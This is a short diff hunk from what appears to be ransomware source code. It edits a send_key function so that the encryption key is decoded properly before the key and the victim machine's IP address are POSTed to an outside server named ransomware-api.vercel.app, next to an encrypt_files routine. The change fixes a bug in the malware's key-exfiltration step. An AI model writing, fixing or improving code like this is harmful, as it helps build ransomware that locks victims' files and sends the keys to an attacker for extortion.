@@ -56,7 +56,7 @@ def encrypt_files():
         
 def send_key(key):
     ip = socket.gethostbyname(socket.gethostname())
-    data = {'key': key, 'ip': str(ip)}
+    data = {'key': key.decode('utf-8'), 'ip': str(ip)}
     data_json = json.dumps(data).encode('utf-8')
 
     req = urllib.request.Request('https://ransomware-api.vercel.app/encryption', data=data_json, method='POST')
